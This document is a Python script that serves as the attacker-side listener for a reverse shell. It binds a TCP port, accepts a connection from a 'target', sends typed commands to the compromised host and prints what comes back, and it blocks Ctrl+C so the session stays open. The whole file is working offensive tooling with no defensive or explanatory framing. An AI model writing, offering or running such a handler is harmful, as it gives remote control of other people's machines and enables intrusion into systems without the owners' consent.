#!/usr/bin/python3
import socket
import sys
import datetime
import os
from signal import signal, SIGINT

#####################################################################
# ORIGINAL AUTHOR: Petr Macharia (https://github.com/peter-macharia)#
# Modifications by: Aqeeb Hussain                                   #
# Error handling, print statements of command output.               #
#####################################################################

# Signal handler to prevent ctrl + c from killing connection
def signal_handler(signal, frame):
    print("Type exit to kill connection")
    #print("\n[!] Connection closed [!]")
    #sys.exit(0)

#create_sock handles our socket connection
def create_sock(ip_addr, serv_port):
    try:
        # Make a TCP socket
        sock_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Re-use the address for more incoming clients
        sock_conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Bind a socket to the port 
        sock_conn.bind((ip_addr, serv_port))
        sock_conn.listen(5)
        # Point out where the socket is listening on 
        print("Listening at: {}:{}".format(ip_addr, serv_port))
        return sock_conn

    # Error handling
    except socket.gaierror:
        sys.exit("Error: Unable to create connection")
    except socket.error:
        sys.exit("Error: something went wrong")
    except KeyboardInterrupt:
        sys.exit("Error: Interrupted by user")
    except ConnectionResetError:
        sys.exit("Error: Client has disconnected")

def accept_conn(socket_connection):
    client_conn, addr_client = socket_connection.accept()
    return client_conn, addr_client

def perform_task(client_conn):
    while True:
        try:
            command = input("$ ")
            # If the command is empty then print an error message
            if not command.split():
                print("Empty...")
                continue

            # Send an encoded command across
            # 
            command = command.encode("utf-8")
            #command = str.encode(command)
            # Send the encoded data
            client.send(command)
            # When SIGINT is pressed, catch it
            signal(SIGINT, signal_handler)
            while True:
                # Byte data coming from the client in reverse shell
                raw_data = client.recv(1024)
                # Decoded data from bytes to string in order to read it.
                decoded_data = raw_data.decode("utf-8")
                print(decoded_data)

                # If no data is coming in then stop the socket
                if not decoded_data:
                    # Raise exception if data is not coming in.
                    raise Exception("Error: Data not being received")
                    break
                
                if len(decoded_data) > 0:
                    #if 'done' in data.decode("utf-8", "replace"):
                    if 'done' in decoded_data:
                        break

                    #if "exit" in data.decode("utf-8", "replace"):
                    if "exit" in decoded_data:
                        sys.exit("\n")

        except KeyboardInterrupt:
            sys.exit(0)

if __name__ == '__main__':
    ip = sys.argv[1]
    port = int(sys.argv[2])
    # Create the socket to listen
    sock = create_sock(ip, port)
    client, addr = accept_conn(sock)
    print("[+] Connection recieved from target: {} [+]".format(addr[0]))
    perform_task(client)
